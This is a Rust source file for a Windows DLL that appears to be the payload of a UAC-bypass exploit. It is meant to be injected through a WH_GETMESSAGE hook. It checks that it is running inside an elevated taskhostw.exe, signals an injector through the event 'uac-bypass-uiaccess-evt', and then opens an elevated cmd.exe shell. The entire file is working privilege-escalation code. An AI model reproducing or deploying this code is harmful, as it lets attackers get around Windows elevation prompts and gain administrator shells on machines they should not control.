#![no_std]

//! A very simple Windows module that just pops a command prompt shell.
//!
//! Since the Rust standard library is not required, this module is marked as `no_std`

use core::ffi::CStr;

use windows::{
    Win32::{
        Foundation::{CloseHandle, HANDLE, HMODULE, LPARAM, LRESULT, MAX_PATH, WPARAM},
        Security::{GetTokenInformation, TOKEN_ALL_ACCESS, TokenElevation},
        System::{
            LibraryLoader::{GetModuleFileNameA, GetModuleHandleA, GetProcAddress},
            Threading::{
                CREATE_NEW_CONSOLE, CreateProcessA, GetCurrentProcess, OpenEventA,
                OpenProcessToken, PROCESS_INFORMATION, STARTUPINFOA, SetEvent, TIMER_MODIFY_STATE,
            },
        },
        UI::{Shell::PathFindFileNameA, WindowsAndMessaging::CallNextHookEx},
    },
    core::{PCSTR, s},
};

const DLL_PROCESS_ATTACH: u32 = 1;

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(_module: HMODULE, reason: u32, _reserved: *mut u8) -> bool {
    if reason != DLL_PROCESS_ATTACH {
        return true;
    }

    // Prevent executing payload when loaded by the injector
    unsafe {
        let Ok(main_module) = GetModuleHandleA(PCSTR::null()) else {
            return false;
        };

        if let Some(is_injector_proc) = GetProcAddress(main_module, s!("is_injector")) {
            let result = is_injector_proc();
            if result > 0 {
                return true;
            }
        }
    }

    // Check if we are running in the correct process and notify injector
    unsafe {
        let mut path = [0; MAX_PATH as _];
        let length = GetModuleFileNameA(None, &mut path);
        if length == 0 {
            return false;
        }

        let filename = PathFindFileNameA(PCSTR(path.as_ptr()));
        let filename_c = CStr::from_ptr(filename.as_ptr() as _);

        if filename_c != c"taskhostw.exe" {
            return false;
        }

        if !is_elevated().unwrap_or(false) {
            return false;
        }

        // Notify the injector to unhook
        let Ok(event) = OpenEventA(TIMER_MODIFY_STATE, false, s!("uac-bypass-uiaccess-evt")) else {
            return false;
        };

        _ = SetEvent(event);
        _ = CloseHandle(event);
    }

    // Pop a shell
    unsafe {
        let mut si = STARTUPINFOA::default();
        let mut pi = PROCESS_INFORMATION::default();
        si.cb = size_of_val(&si) as _;

        if CreateProcessA(
            s!("cmd.exe"),
            None,
            None,
            None,
            false,
            CREATE_NEW_CONSOLE,
            None,
            PCSTR::null(),
            &si,
            &mut pi,
        )
        .is_ok()
        {
            _ = CloseHandle(pi.hProcess);
            _ = CloseHandle(pi.hThread);
        }
    }

    // Prevent the module from being loaded, as some applications for some reason never release the module even after unhooking
    false
}

/// `WH_GETMESSAGE` hook procedure
#[unsafe(no_mangle)]
pub extern "system" fn windows_hook_proc(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    unsafe { CallNextHookEx(None, code, wparam, lparam) }
}

fn is_elevated() -> windows::core::Result<bool> {
    unsafe {
        let mut token = HANDLE::default();
        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &mut token)?;

        let mut length = 0;
        let mut elevated = 0u32;
        GetTokenInformation(
            token,
            TokenElevation,
            Some(&mut elevated as *mut _ as *mut _),
            4,
            &mut length,
        )?;

        Ok(elevated != 0)
    }
}
